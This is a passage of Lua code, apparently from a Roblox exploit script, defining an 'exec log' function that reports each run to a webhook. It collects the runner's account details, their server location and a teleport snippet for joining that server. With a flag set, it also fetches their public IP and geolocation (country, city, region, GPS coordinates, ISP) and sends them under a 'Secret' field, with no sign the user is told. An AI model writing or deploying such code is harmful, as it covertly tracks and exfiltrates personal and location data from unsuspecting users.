--// ============ EXEC LOG (fungsi lama) ============
local function sendExecLog()
    local player = LP
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local ok, gameInfo = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    local gameName = ok and gameInfo.Name or "Unknown"
    local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local ws = workspace
    local screenWidth = math.floor(ws.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(ws.CurrentCamera.ViewportSize.Y)
    local memoryUsage = Stats:GetTotalMemoryUsageMb()
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
    local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
    local gameVersion = game.PlaceVersion

    local pingValue = "N/A"
    pcall(function()
        local dataPing = Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
        pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    end)

    local premium = "false"
    local ok2, response = pcall(function() return player.MembershipType end)
    if ok2 then premium = response == Enum.MembershipType.None and "false" or "true" end

    local data = {
        title = "🚀 Script Execution Detected",
        description = "*A script was executed.*",
        color = 0x3498db,
        fields = {
            {name = "🔍 Script Info", value = "```💻 " .. getgenv().whscript .. "\n⏰ " .. completeTime .. "```", inline = false},
            {name = "👤 Player", value = "```🧸 " .. player.Name .. "\n📝 " .. player.DisplayName .. "\n🆔 " .. userid .. "\n❤️ " .. health .. " / " .. maxHealth .. "```", inline = false},
            {name = "📅 Account", value = "```🗓️ " .. player.AccountAge .. " days\n💎 Premium: " .. premium .. "```", inline = false},
            {name = "🎮 Game", value = "```🏷️ " .. gameName .. "\n🆔 " .. gameid .. "\n🔢 v" .. gameVersion .. "```", inline = false},
            {name = "🕹️ Server", value = "```👥 " .. playerCount .. " / " .. maxPlayers .. "\n🕒 " .. os.date("%H:%M:%S") .. "```", inline = true},
            {name = "📡 Network", value = "```📶 Ping: " .. pingValue .. " ms```", inline = true},
            {name = "🖥️ System", value = "```📺 " .. screenWidth .. "x" .. screenHeight .. "\n🔍 " .. memoryUsage .. " MB\n⚙️ " .. tostring(identifyexecutor()) .. "```", inline = true},
            {name = "📍 Position", value = "```📍 " .. tostring(position) .. "```", inline = true},
            {name = "🪧 Join Script", value = "```lua\n" .. snipePlay .. "```", inline = false}
        },
        thumbnail = {url = thumbURL()},
        footer = baseFooter()
    }

    if getgenv().ExecLogSecret then
        pcall(function()
            local ip = game:HttpGet("https://api.ipify.org")
            local info = HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/" .. ip .. "/json"))
            table.insert(data.fields, {
                name = "🤫 Secret",
                value = "||👣 IP: " .. tostring(info.ip) .. "||\n||🌆 Country: " .. tostring(info.country) .. "||\n||🪟 GPS: " .. tostring(info.loc) .. "||\n||🏙️ City: " .. tostring(info.city) .. "||\n||🏡 Region: " .. tostring(info.region) .. "||\n||🪢 Hoster: " .. tostring(info.org) .. "||"
            })
        end)
    end

    sendWebhook(data)
end

